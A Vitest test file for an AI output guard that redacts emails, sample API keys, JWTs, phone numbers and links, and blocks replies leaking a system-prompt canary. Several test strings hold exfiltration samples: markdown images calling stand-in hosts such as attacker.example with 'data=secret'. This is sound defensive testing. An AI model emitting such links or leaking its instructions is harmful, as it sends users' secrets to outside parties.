import { describe, expect, it } from "vitest";
import { OutputGuard, sanitizeOutput } from "@/ai/guard/output-filter";

describe("sanitizeOutput", () => {
  it.each([
    ["an email", "Write to ali.veli@example.com for help.", "[email removed]", "email"],
    ["an Anthropic key", "Use sk-ant-api03-AbCdEfGhIjKlMnOpQrStUv now.", "[removed]", "secret"],
    ["an AWS key", "Key AKIAABCDEFGHIJKLMNOP here.", "[removed]", "secret"],
    ["a JWT", "Token eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0In0.abcDEF123456 ok", "[removed]", "secret"],
    ["a markdown image", "Look ![x](http://evil.example/p?d=secret) here", "Look  here", "markdown_image"],
    ["an external URL", "See https://evil.example/collect?d=1 for more.", "[link removed]", "url"],
    ["a www link", "Visit www.example.com today.", "[link removed]", "url"],
    ["an internal id", "The program cms105pzp000b7s3m68bo0qud is full.", "[id removed]", "internal_id"],
    ["an Azerbaijani phone", "Call +994 50 123 45 67 now.", "[phone removed]", "phone"],
    ["a Turkish phone", "Ara 0532 123 45 67 lütfen.", "[phone removed]", "phone"],
  ])("removes %s", (_, input, expected, kind) => {
    const { text, redactions } = sanitizeOutput(input);
    expect(text).toContain(expected);
    expect(redactions).toContain(kind);
  });

  it("leaves business numbers alone", () => {
    const text = "Break-even: 5 000 000 AZN fixed costs / (25 - 10) = 333 334 units, margin 60%.";
    expect(sanitizeOutput(text)).toEqual({ text, redactions: [] });
  });
});

describe("OutputGuard", () => {
  const canary = "zephyrdeadbeef1234";

  it("blocks a reply that leaks the canary, even split across chunks", () => {
    const guard = new OutputGuard(canary);
    const sent = [guard.push("My rules say [CANARY: zephyr"), guard.push("deadbeef1234] never"), guard.push(" share.")].join("") + guard.finish();
    expect(guard.blocked).toBe(true);
    expect(sent).not.toContain("zephyr");
  });

  it("never emits half a pattern: text is released at sentence ends", () => {
    const guard = new OutputGuard(canary);
    const parts = ["Email me at ali", "@exam", "ple.com", " please. Next"];
    const out = parts.map((p) => guard.push(p)).join("") + guard.finish();
    expect(out).toBe("Email me at [email removed] please. Next");
    expect(guard.text).toBe(out);
  });

  it("strips a markdown image used for exfiltration", () => {
    const guard = new OutputGuard(canary);
    const out = guard.push("Great idea! ![a](https://attacker.example/x?data=secret) Keep going.") + guard.finish();
    expect(out).not.toMatch(/attacker|!\[/);
    expect(guard.redactions).toContain("markdown_image");
  });
});
